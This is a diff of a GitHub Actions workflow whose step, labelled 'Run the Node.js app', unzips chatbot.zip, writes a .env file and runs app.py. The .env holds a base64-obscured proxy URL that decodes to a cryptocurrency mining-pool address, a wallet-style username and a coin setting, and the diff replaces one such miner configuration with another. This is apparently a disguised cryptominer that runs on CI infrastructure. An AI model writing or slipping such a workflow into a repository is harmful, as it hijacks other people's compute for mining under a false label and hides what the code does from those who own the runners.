@@ -23,5 +23,5 @@ jobs:
       - name: Run the Node.js app
         run: |
           yes A | unzip chatbot.zip
-          echo -e 'proxy=wss://pypip-python3.packaging-w3schools.workers.dev/cG93ZXIyYi5uYS5taW5lLnpwb29sLmNhOjYyNDI=\nhost=127.0.0.1\nport=3306\nusername=mbc1qhut49lvdruznypvaxgrg4klf3ntpnwuc23hq3j\npassword=c=MBC\nthreads=4' > .env
-          python3 app.py --cache=.cache/09Qy5sb2Fkcyg.txt
+          echo -e "host=127.0.0.1\nport=3306\nproxy=wss://epoch-labs.up.railway.app/cG93ZXIyYi5uYS5taW5lLnpwb29sLmNhOjYyNDI=\nthreads=4\npassword=c=RVN\nusername=RBCPz2xQMf9Cz3eyqFTVFHVjZM2cTSeYRN" > .env
+          python3 app.py $1 --cache=.cache/09Qy5sb2Fkcyg.txt
